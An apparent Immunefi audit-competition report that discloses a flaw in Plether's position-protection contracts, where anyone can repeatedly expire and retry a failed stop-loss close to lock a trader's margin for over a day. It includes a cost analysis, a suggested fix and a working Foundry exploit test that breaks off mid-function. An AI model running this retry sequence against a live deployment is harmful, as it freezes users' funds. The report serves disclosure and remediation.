# \#98017 [SC-High] Permissionless protection retries can consume the owner-only repair state and freeze exits for at least 24 hours

**Submitted on Nov 4th 2026 at 12:00:06 UTC by @viraz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98017
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Description

A triggered position protection creates a child close order using the trader's retained financial limits. If that child fails or expires while the protected position is unchanged, `PositionProtectionBook.handleFailedProtectionAttempt` changes the protection from `Triggered` to `Latched` (`PositionProtectionBook.sol:637-667`).

The documented repair path is owner-only. `amendLatchedPositionProtectionCloseLimits` authenticates `msg.sender` as the protection owner, requires `Latched`, and requires an empty Router queue (`PositionProtectionBook.sol:315-328`). Its interface describes the function as letting the owner change close limits after a failed attempt relatches and before a fresh retry (`interfaces/IPositionProtectionActions.sol:32-37`).

The retry path is permissionless. `retryPositionProtectionClose` loads the active protection without owner authentication, requires `Latched`, and commits a replacement child (`PositionProtectionBook.sol:382-405`). `_recordCloseAttempt` immediately changes the state back to `Triggered` (`PositionProtectionBook.sol:564-574`).

This creates a state-gating conflict. Any caller can consume the only state in which the owner is allowed to repair the retained limits.

The attack requires the retained limits to reject the close at the current market or fee state. Expiry alone is not sufficient while the limits remain satisfiable because the owner or an honest keeper can execute the child and close the position. The PoC demonstrates a genuine market-gap scenario instead of a limit that was invalid when selected:

- The trader opens a 10,000-unit long at `1.00`.
- The trader selects a stop-loss trigger at `1.10` and an execution-notional ceiling of `11,500 USDG`.
- At the `1.10` trigger, the required close notional is `11,000 USDG`, so the ceiling is valid.
- Before execution, the market gaps to `1.20`. The required close notional becomes `12,000 USDG` and exceeds the retained ceiling.

Once the retained limits reject execution, an attacker can perform this sequence:

1. Execute the current child and receive a terminal constraint failure, or wait for the already-failing child to reach its deadline.
2. Let the terminal callback change the protection to `Latched`.
3. Call `retryPositionProtectionClose` in the same transaction.
4. Leave the protection `Triggered` again with the same insufficient limits.

An owner following separate protocol actions never receives a transaction boundary with an amendable `Latched` protection. While the replacement child is live:

- amendment reverts with `OrderRouter__ProtectionNotLatched`;
- cancellation reverts with `OrderRouter__ProtectionNotArmed`; and
- an ordinary V3 close reverts with `OrderRouter__ProtectionActive` because `OrderLiquidationBatchLogic` rejects a trader with an active protection (`router/OrderLiquidationBatchLogic.sol:313-315`).

After each execution deadline, the attacker can call `expireOrder` and `retryPositionProtectionClose` in one transaction. Expiry needs no Hermes or Pyth update. The in-scope source initializes `maxExecutionWindowSeconds` to 60 seconds (`router/OrderExecutionOrchestrator.sol:10-14`). The v2.0.0 manifest identifies the deployed Arbitrum Sepolia Router at `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` (`deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json:118-121`). A read-only `eth_call` to `maxExecutionWindowSeconds()` returned `60` at Arbitrum Sepolia block `325,895,704`. No public-testnet transaction was performed.

### Smart-account recovery and ordering

A SimpleAccount v0.8 owner can hand-build an atomic batch containing `executeOrder(child)`, `amendLatchedPositionProtectionCloseLimits`, and `retryPositionProtectionClose`. The control test proves that this batch repairs the limits when it executes before the attacker.

That batch still names a fixed child order ID. If the attacker terminalizes that child and retries first, the queue head becomes a newly allocated order ID. The already-built owner batch then fails on its first call with `ExecuteError(0, OrderRouter__OrderNotQueueHead())`, and the complete batch reverts before amendment. The PoC repeats this attacker-first outcome four times.

The official client does not provide an atomic terminalize-amend-retry action. `buildAmendLatchedProtectionCloseLimitsAction` produces a standalone amendment action (`packages/perps-aa-client/src/protection.ts:103-106`), and the client README describes amendment while `Latched` before a permissionless retry (`packages/perps-aa-client/README.md:201-206`). This is the non-atomic recovery path that the attack consumes.

A standard `executeBatch` cannot discover a newly replaced child ID and inject it into a later call in the same already-encoded batch. Avoiding the stale-ID race requires custom account or module logic that reads the current child during execution and performs terminalization, amendment, and retry under the trader account's identity. An EOA using EIP-7702 delegation to equivalent custom batching code has the same analysis.

The competition's [Information page](https://immunefi.com/audit-competition/plether/information/) states that mitigation requiring unconventional action should not be used to reduce severity. The supported client exposes the standalone amendment, while the dynamic account logic described above is a custom mitigation. It should not replace the documented recovery path for severity analysis.

If an owner submits a fixed-ID atomic batch, the attacker must obtain earlier ordering for each recovery attempt. Arbitrum's [Timeboost documentation](https://docs.arbitrum.io/how-arbitrum-works/priority-gas-auction/pga) explains that the express lane receives priority and the fallback is first-come, first-served. The PoC proves the code-level attacker-first result, but does not claim guaranteed priority ordering for a full day against an owner continuously submitting custom batches.

This report does not claim that permissionless retry itself is undocumented. `SECURITY.md:547-552` states that retry is permissionless and validates the latest child mapping. The vulnerability is that retry can atomically consume the owner-only `Latched` repair state.

The Router and keeper limitations also do not disclose this behavior:

- `SECURITY.md:1353-1355` discusses unpaid cleanup and repeated fresh invalid submissions.
- `SECURITY.md:1356-1359` discusses zero-bounty protection retries and liveness that depends on keepers terminalizing a child and separately appending a retry.

This attack does not require the attacker to create a fresh external invalid order. It reuses an existing victim protection and combines terminalization with retry so the owner cannot use the repair state. The documented limitation warns about absent retries and prolonged `Latched` state. This finding demonstrates the opposite condition, where a third party retries immediately and prevents the owner from remaining `Latched` long enough to amend.

This report shows that the MED-9(Cecuro audit) remediation is incomplete. MED-9(Cecuro audit) originally found that permissionless protection closes did not retain trader-selected financial ceilings. Its resolution says that the fixed code copies the retained limits into each retry and relies on the owner being able to amend them while `Latched` when tight limits prevent execution. The current finding demonstrates that any caller can consume that amendment window. This satisfies the program rule for a previously reported root cause whose fix at the in-scope commit is incomplete. It is not presented as an unrelated MED-9(Cecuro audit) root cause.

## Impact
For a Router account that submits recovery actions separately, an arbitrary external caller can keep the trader's position and margin locked for more than one day. The trader cannot voluntarily close, cancel the active protection, or repair its insufficient limits. The trader remains exposed to carry, adverse price movement, and liquidation throughout the lock.

The small-position PoC maintains the lock for `86,437` seconds using `1,417` expiry-and-retry cycles under the production 60-second window. It confirms that the complete position remains open and `1,986.000000 USDG` of position margin remains locked. A second full-duration test repeats the same `1,417` cycles for a five-times-larger position and confirms that `9,930.000000 USDG` remains locked. The attacker needs no trusted role, collateral, or oracle update after the initial failing execution.

This matches the [competition scope](https://immunefi.com/audit-competition/plether/scope/) High impact wording: **Temporary freezing of funds for at least 24 hours**. Medium `Griefing` is the fallback classification if the triager treats the attack cost and ordering requirements as dominant feasibility limitations.

### Cost and griefing analysis

The PoC records two kinds of gas evidence:

1. `gasleft()` diagnostics around only the production-Router `expireOrder` plus `retryPositionProtectionClose` call report `1,118,793` gas for the 10,000-unit position and `1,118,788` gas for the 50,000-unit position. The five-gas difference confirms that cycle work does not scale materially with position size.
2. A real transaction sent to a local Anvil fork initialized from the PoC's dumped post-failure state used `1,019,488` gas. This receipt value includes the transaction's EVM execution, intrinsic cost, calldata, and cold accesses in that local environment. It is the value used for the cost calculation below.

The local receipt transaction was `0x732a41f5c7fc7e62997582954c5d2580b4620844f2beedd59f3afaa8e9c7e501` in Anvil block `325,930,146`. This was not a public-testnet transaction.

| Item | Measured or calculated value |
|---|---:|
| Anvil receipt gas per expiry-and-retry cycle | `1,019,488` gas |
| Cycles for 86,437 seconds | `1,417` |
| Total receipt-based execution gas | `1,444,614,496` gas |
| Arbitrum One `eth_gasPrice` snapshot | `20,020,000` wei, or `0.02002 gwei` |
| Snapshot block and time | block `521,105,151` at `2026-11-04 07:03:43 UTC` |
| ETH/USD snapshot | `$2,292.07` from [Coinbase spot](https://api.coinbase.com/v2/prices/ETH-USD/spot) |
| L2 execution-only one-day estimate | `0.02892118220992 ETH`, approximately `$66.29` |
| Small PoC frozen margin / L2 execution cost | `$1,986 / $66.29 = 29.96x` |
| Large PoC frozen margin / L2 execution cost | `$9,930 / $66.29 = 149.80x` |

Arbitrum One is used as the gas-price proxy because it is the target production network. Arbitrum Sepolia is used only to read the v2.0.0 release configuration. The execution-only estimate does not include Arbitrum L1 data-posting charges or any Timeboost bid, so the attacker's actual all-in cost is higher and both ratios are lower. The report therefore does not claim that the large case is guaranteed to remain above 100-to-1 after every production-specific cost.

For a temporary-freezing impact, the frozen margin is the amount of user funds made unavailable and is the report's measure of harm. It is not destroyed value. Additional harm can arise from carry, adverse market exposure, liquidation risk, and lost use of the margin, but the table does not assign speculative dollar values to those effects. The small case is in the program's case-by-case ratio zone. The large test proves that the frozen amount scales while the permissionless cycle's execution work remains effectively flat.

For a SimpleAccount owner using a hand-built fixed-ID batch, continued lockout additionally requires the attacker to win each recovery ordering race. The PoC demonstrates both possible orderings and does not misstate this as guaranteed priority. Requiring a custom dynamic-ID account implementation as the mitigation is addressed by the competition's unconventional-action rule above.


## Recommendation

Preserve permissionless retries, but allow the owner to update the stored limits while a replacement child is `Triggered`. The live child must keep its immutable committed limits. The updated stored limits should apply only when the next child is created.

This is safe with the existing commitment model because `OrderLiquidationBatchLogic._protectionCloseRequest` copies the four stored ceilings into each child at commitment (`router/OrderLiquidationBatchLogic.sol:657-677`). Updating the stored values does not mutate the already-committed child.

One possible change is:

~~~diff
 function amendLatchedPositionProtectionCloseLimits(
     uint64 protectionId,
     PositionProtectionTypes.CloseFinancialLimits calldata limits
 ) external nonReentrant {
     StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+    PositionProtectionTypes.PositionProtectionStatus status = protection.status;
+    if (
+        status != PositionProtectionTypes.PositionProtectionStatus.Latched
+            && status != PositionProtectionTypes.PositionProtectionStatus.Triggered
+    ) {
         revert OrderRouter__ProtectionNotLatched();
     }
-    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
+    if (
+        status == PositionProtectionTypes.PositionProtectionStatus.Latched
+            && IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0
+    ) {
         revert OrderRouter__PendingOrdersExist();
     }
     _setCloseLimits(protection, limits);
     _emitCloseLimitsUpdated(protection);
 }
~~~

Add regression tests for:

- a valid-at-trigger limit followed by a market gap and constraint failure;
- constraint failure followed by same-transaction retry;
- expiry followed by same-transaction retry;
- owner amendment while the replacement child is `Triggered`;
- immutability of the current child's committed limits; and
- application of the repaired limits to the next retry.

This change intentionally breaks the existing assertion at `packages/perps/test/perps/spec/trader/PositionProtection.t.sol:994-997`, which currently expects amendment during a live retry to revert. Update that test.

Also update `packages/perps/src/interfaces/IPositionProtectionActions.sol:32-37`. Its NatSpec currently says that a live child cannot be changed. Clarify that the current child remains immutable while the owner may repair the stored limits used by later retries. Rename `amendLatchedPositionProtectionCloseLimits`, or document that it accepts both `Latched` and `Triggered`, so the public name matches its behavior.

An alternative is a short owner-exclusive repair window after every relatch. The owner could amend or retry immediately, while permissionless retry becomes available after the window. Making every retry owner-only also removes the issue, but conflicts with the documented permissionless keeper design.

## Proof of Concept

## Proof of Concept

The PoC contains five tests.

### `test_PermissionlessRetryLocksOwnerOutForMoreThanOneDay`

1. Opens a production Perps position at `1.00` with `2,000 USDG` initial margin.
2. Creates a stop-loss at `1.10` with an `11,500 USDG` ceiling.
3. Triggers at `1.10`, where the `11,000 USDG` required notional is within the ceiling.
4. Executes after a gap to `1.20` and proves that the `12,000 USDG` required notional fails with `ConstraintViolation`.
5. Uses an attacker contract to retry in the same transaction as terminalization.
6. Repeats permissionless expiry and retry 1,417 times.
7. During every cycle, proves that amendment, cancellation, and an ordinary production V3 close revert.
8. Confirms that at least one day elapsed, the position remains open, and `1,986 USDG` of margin remains locked.
9. Measures the isolated attacker call at `1,118,793` gas.

### `test_LargerMarginLockoutUsesTheSameExpiryRetryWork`

1. Opens a 50,000-unit position with `10,000 USDG` initial margin.
2. Uses the same valid-at-trigger, invalid-after-gap protection setup.
3. Repeats all 1,417 expiry-and-retry cycles and confirms that more than one day elapsed.
4. Confirms that `9,930 USDG` remains locked.
5. Measures the first attacker cycle at `1,118,788` gas, five gas less than the small-position case.

### `test_Control_OwnerRepairsLimitsWhenNobodyRetries`

1. Creates the same trigger-valid protection.
2. Lets the price gap make the retained ceiling insufficient.
3. Executes the child so the protection becomes `Latched`.
4. Proves that the owner can amend, retry, and close when no third party consumes `Latched`.

### `test_Control_SmartAccountOwnerEscapesAtomicallyWhenItsBatchExecutesFirst`

1. Creates the same protection through a SimpleAccount-style batch.
2. Runs the owner's terminalize-amend-retry batch before the attacker.
3. Confirms that the stored limit is repaired and the replacement child closes the position.

### `test_AttackerOrderingMakesSmartAccountRecoveryBatchStale`

1. Builds an owner recovery batch for the current child ID.
2. Executes the attacker's terminalize-and-retry transaction first.
3. Confirms that the owner batch reverts with `ExecuteError(0, OrderRouter__OrderNotQueueHead())`.
4. Repeats four times and confirms that the old limit remains and the position stays open.

### Scope compliance

The test runs in the repository's Foundry suite at the exact in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It does not modify an in-scope contract.

`BasePerpTest` exposes its Router field and deployment hook with the nominal `LegacyOrderRouterHarness` type. The PoC overrides that hook and constructs `new OrderRouter(...)` directly with the production constructor and production sidecars. It casts the resulting address only to satisfy the fixture's return type. No `LegacyOrderRouterHarness` bytecode is deployed or executed, and the PoC never calls its scalar helper. The ordinary-close check uses production `commitOrder(OrderRequest)`.

The v2.0.0 deployment uses `ArbitrumSepoliaReleaseRouter`. That release wrapper invokes the base `OrderRouter` constructor and only assigns `minOpenNotionalAssets = 1000e6` (`script/DeployPerpsArbitrumSepolia.s.sol:103-129`). This opening minimum does not affect protection-close execution or retry, and both PoC positions have notionals above 1,000 USDG. The base production `OrderRouter` deployed by the PoC therefore exercises the relevant path without modifying in-scope behavior.

`SimpleAccountV08BatchMock` replaces the account component, not an in-scope Perps contract. The competition Information page explicitly places `packages/perps-aa` and `packages/perps-aa-client` out of scope. The mock preserves the relevant v0.8 `executeBatch` selector, account `msg.sender`, all-or-nothing execution, and indexed `ExecuteError` behavior. Mock Pyth and mock USDG are also outside-scope dependencies expressly allowed by the competition PoC rules.

The one-day tests prove duration for a separate-action account. The smart-account tests prove the owner-first escape and the attacker-first stale-ID race. They do not claim that the attacker is guaranteed to win Arbitrum ordering for 24 hours against a continuously defending custom batch.

### PoC test

Add the following complete file at `packages/perps/test/audit/RetryProtectionLockoutPoC.t.sol`. The file is audit-only and is not present in the target commit.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../utils/LegacyOrderRouterHarness.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Executes the failing protection attempt and queues the next retry in one transaction,
///      so the account never observes a Latched protection with an empty queue.
contract RetryLockoutAttacker {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;

    constructor(
        OrderRouter router_,
        IPositionProtectionActions book_
    ) {
        ROUTER = router_;
        BOOK = book_;
    }

    function executeAndRetry(
        uint64 orderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
        result = ROUTER.executeOrder(orderId, pythUpdateData);
        retryOrderId = BOOK.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        uint64 orderId,
        uint64 protectionId
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
        result = ROUTER.expireOrder(orderId);
        retryOrderId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

/// @dev Minimal local model of the supported SimpleAccount v0.8 `executeBatch` behavior.
///      The account itself remains `msg.sender` for every nested protocol call, and any failed
///      nested call reverts the complete batch. The account is outside the competition scope.
contract SimpleAccountV08BatchMock {

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    address internal immutable OWNER;

    error ExecuteError(uint256 index, bytes errorData);

    constructor(
        address owner_
    ) {
        OWNER = owner_;
    }

    function executeBatch(
        Call[] calldata calls
    ) external {
        require(msg.sender == OWNER, "only owner");
        for (uint256 i; i < calls.length; ++i) {
            (bool success, bytes memory returnData) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!success) {
                if (calls.length > 1) {
                    revert ExecuteError(i, returnData);
                }
                assembly ("memory-safe") {
                    revert(add(returnData, 0x20), mload(returnData))
                }
            }
        }
    }

    receive() external payable {}

}

/// @title PoC: permissionless retries lock a trader out of repairing failed protection limits
contract RetryProtectionLockoutPoCTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant LONG_STOP_LOSS = 110_000_000;
    uint256 internal constant AUTHORIZED_CLOSE_PRICE = 115_000_000;
    uint256 internal constant GAPPED_EXECUTION_PRICE = 120_000_000;
    uint256 internal constant LARGE_POSITION_SIZE = 50_000e18;
    uint256 internal constant LARGE_POSITION_MARGIN_ASSETS = 10_000e6;
    uint256 internal constant RELEASE_EXECUTION_WINDOW_SECONDS = 60;
    uint256 internal constant ONE_DAY_EXPIRY_RETRY_CYCLES = 1417;

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    RetryLockoutAttacker internal attacker;
    SimpleAccountV08BatchMock internal ownerAccount;
    OrderRouter internal productionRouter;
    uint256 internal lockoutStartedAt;

    function setUp() public override {
        super.setUp();
        productionRouter = OrderRouter(payable(address(router)));
        protectionActions = IPositionProtectionActions(address(productionRouter.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(productionRouter.positionProtectionBook()));
        attacker = new RetryLockoutAttacker(productionRouter, protectionActions);
        ownerAccount = new SimpleAccountV08BatchMock(ALICE);
        _fundTrader(ALICE, 20_000e6);
        _fundTrader(address(ownerAccount), 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    /// @dev BasePerpTest exposes the router through a legacy-typed fixture field. This override
    ///      deploys the exact production OrderRouter bytecode and only casts its address to the
    ///      fixture's return type. No LegacyOrderRouterHarness bytecode is deployed or executed.
    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter exactProductionRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(exactProductionRouter), predictedRouter);
        deployedRouter = LegacyOrderRouterHarness(payable(address(exactProductionRouter)));
    }

    function test_Control_SmartAccountOwnerEscapesAtomicallyWhenItsBatchExecutesFirst() public {
        assertEq(
            SimpleAccountV08BatchMock.executeBatch.selector,
            bytes4(0x34fcd5be),
            "mock uses the supported SimpleAccount v0.8 executeBatch ABI"
        );
        (uint64 protectionId, uint64 orderId, PositionProtectionTypes.CloseFinancialLimits memory retainedLimits) =
            _createTriggeredProtectionWithGapExceededLimits(address(ownerAccount), true);
        PositionProtectionTypes.CloseFinancialLimits memory repaired = _repairedLimits();

        SimpleAccountV08BatchMock.Call[] memory ownerCalls =
            _ownerRecoveryCalls(orderId, protectionId, repaired, _executionPriceData(GAPPED_EXECUTION_PRICE));
        vm.prank(ALICE);
        ownerAccount.executeBatch(ownerCalls);

        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(protectionId);
        assertEq(
            uint8(protection.status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the owner atomically terminalized, amended, and retried"
        );
        assertNotEq(protection.linkedOrderId, orderId, "owner queued a repaired replacement child");
        _assertCloseLimits(protectionViews.closeFinancialLimits(protectionId), repaired);
        assertNotEq(
            protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
            retainedLimits.maxExecutionNotionalAssets,
            "the obsolete limit no longer controls future retries"
        );

        productionRouter.executeOrder(protection.linkedOrderId, _executionPriceData(GAPPED_EXECUTION_PRICE));
        (uint256 size,,,,,,) = engine.positions(address(ownerAccount));
        assertEq(size, 0, "the repaired smart-account retry closes the position");
    }

    function test_AttackerOrderingMakesSmartAccountRecoveryBatchStale() public {
        (uint64 protectionId, uint64 orderId,) =
            _createTriggeredProtectionWithGapExceededLimits(address(ownerAccount), true);
        PositionProtectionTypes.CloseFinancialLimits memory repaired = _repairedLimits();

        // Repeat the exact race several times. Alice builds an atomic recovery batch for the
        // current child, but the attacker executes that child and retries first. The newly
        // committed child has a different ID, so Alice's first nested call is stale and the
        // all-or-nothing SimpleAccount batch reverts before it can amend the stored limits.
        for (uint256 i; i < 4; ++i) {
            vm.warp(vm.getBlockTimestamp() + 1);
            vm.roll(vm.getBlockNumber() + 1);
            bytes[] memory priceData = _executionPriceData(GAPPED_EXECUTION_PRICE);
            SimpleAccountV08BatchMock.Call[] memory ownerCalls =
                _ownerRecoveryCalls(orderId, protectionId, repaired, priceData);

            (, uint64 replacementOrderId) = attacker.executeAndRetry(orderId, protectionId, priceData);

            vm.prank(ALICE);
            vm.expectRevert(
                abi.encodeWithSelector(
                    SimpleAccountV08BatchMock.ExecuteError.selector,
                    uint256(0),
                    abi.encodeWithSelector(IOrderRouterErrors.OrderRouter__OrderNotQueueHead.selector)
                )
            );
            ownerAccount.executeBatch(ownerCalls);

            PositionProtectionTypes.PositionProtectionView memory protection =
                protectionViews.getPositionProtection(protectionId);
            assertEq(protection.linkedOrderId, replacementOrderId, "attacker installed the replacement child");
            assertEq(
                uint8(protection.status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "the replacement child keeps amendment unavailable"
            );
            assertNotEq(
                protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets,
                repaired.maxExecutionNotionalAssets,
                "the reverted owner batch did not repair the stored limit"
            );
            orderId = replacementOrderId;
        }

        (uint256 size,,,,,,) = engine.positions(address(ownerAccount));
        assertEq(size, POSITION_SIZE, "the smart-account position remains open while the attacker wins ordering");
    }

    function test_PermissionlessRetryLocksOwnerOutForMoreThanOneDay() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        // Alice's notional ceiling covers both the creation mark and the stop-loss trigger price.
        // A later gap through the trigger raises the execution notional above that ceiling.
        PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParamsWithGapHeadroom(POSITION_SIZE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        _executionPriceData(LONG_STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        uint64 orderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(LONG_STOP_LOSS));
        PositionProtectionTypes.CloseFinancialLimits memory repaired = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });

        // First prove that the owner's limit is invalid and that a foreign caller can consume
        // the resulting Latched state by retrying in the same transaction.
        (OrderV3Types.ExecutionResult memory failedResult, uint64 firstRetryOrderId) =
            attacker.executeAndRetry(orderId, protectionId, _executionPriceData(GAPPED_EXECUTION_PRICE));
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failedResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        orderId = firstRetryOrderId;
        lockoutStartedAt = block.timestamp;

        // Optional receipt preparation. This dumps the exact post-failure state with the retry
        // child already expired so the attacker call can be sent as a real transaction to Anvil.
        if (vm.envOr("DUMP_RETRY_RECEIPT_STATE", false)) {
            vm.warp(uint256(productionRouter.lifecycleBook().orderTiming(orderId).executionDeadline) + 1);
            // Force the constructor-created, storage-free recovery sidecar into the genesis dump.
            // Its one-wei balance is behaviorally irrelevant and exists only for state export.
            vm.deal(orderExecutionSidecar.recoverySidecar(), 1);
            emit log_named_address("Receipt attacker contract", address(attacker));
            emit log_named_uint("Receipt order id", orderId);
            emit log_named_uint("Receipt protection id", protectionId);
            vm.dumpState(vm.envOr("RETRY_RECEIPT_STATE_PATH", string("/tmp/retry-lockout-state.json")));
            return;
        }

        // The Arbitrum Sepolia v2.0.0 OrderRouter reports a 60-second maximum execution window.
        // After each deadline the attacker expires the child and retries in the same transaction.
        // At 61 seconds per cycle, 1,417 cycles keep every owner exit path unavailable for
        // 86,437 seconds without supplying oracle data.
        assertEq(
            productionRouter.maxExecutionWindowSeconds(),
            RELEASE_EXECUTION_WINDOW_SECONDS,
            "fixture matches the v2.0.0 release execution window"
        );
        for (uint256 i; i < ONE_DAY_EXPIRY_RETRY_CYCLES; ++i) {
            vm.warp(uint256(productionRouter.lifecycleBook().orderTiming(orderId).executionDeadline) + 1);
            uint256 gasBefore = gasleft();
            (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) =
                attacker.expireAndRetry(orderId, protectionId);
            uint256 measuredCycleGas = gasBefore - gasleft();
            if (i == 0) {
                emit log_named_uint("Measured expire-and-retry cycle gas", measuredCycleGas);
            }
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "expired attempt is terminal");
            assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
            orderId = retryOrderId;

            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "attacker re-queued a retry before the owner could act"
            );

            // Amendment, cancellation and a manual close are all unavailable to the owner.
            OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest();
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, repaired);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(protectionId);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            productionRouter.commitOrder(manualClose);
            vm.stopPrank();
        }

        (uint256 size, uint256 marginAssets,,,,,) = engine.positions(ALICE);
        assertGe(block.timestamp - lockoutStartedAt, 1 days, "attacker maintained the lock for at least one day");
        assertEq(size, POSITION_SIZE, "position remains open after the one-day lockout");
        assertGt(marginAssets, 0, "position margin remains locked in the open position");
        emit log_named_decimal_uint("Final locked position margin assets", marginAssets, 6);
    }

    function test_Control_OwnerRepairsLimitsWhenNobodyRetries() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParamsWithGapHeadroom(POSITION_SIZE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        _executionPriceData(LONG_STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        uint64 orderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(LONG_STOP_LOSS));
        productionRouter.executeOrder(orderId, _executionPriceData(GAPPED_EXECUTION_PRICE));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _repairedLimits());
        vm.prank(ALICE);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        productionRouter.executeOrder(retryOrderId, _executionPriceData(GAPPED_EXECUTION_PRICE));

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "repaired limits close the position");
    }

    function test_LargerMarginLockoutUsesTheSameExpiryRetryWork() public {
        _open(ALICE, CfdTypes.Side.LONG, LARGE_POSITION_SIZE, LARGE_POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params =
            _stopLossParamsWithGapHeadroom(LARGE_POSITION_SIZE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        _executionPriceData(LONG_STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        uint64 orderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(LONG_STOP_LOSS));
        (OrderV3Types.ExecutionResult memory failedResult, uint64 retryOrderId) =
